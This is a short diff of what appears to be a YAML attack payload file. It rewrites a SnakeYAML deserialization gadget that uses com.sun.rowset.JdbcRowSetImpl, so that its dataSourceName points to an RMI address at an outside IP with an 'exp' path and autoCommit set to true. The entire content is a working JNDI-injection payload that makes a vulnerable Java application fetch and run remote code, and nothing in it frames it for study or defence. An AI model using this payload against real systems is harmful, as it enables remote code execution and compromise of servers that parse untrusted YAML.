@@ -1,3 +1,1 @@
-!!com.sun.rowset.JdbcRowSetImpl
-  dataSourceName: "http://188.131.187.191:9999/"
-  autoCommit: true
+!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: 'rmi://188.131.187.191:9999/exp', autoCommit: true}
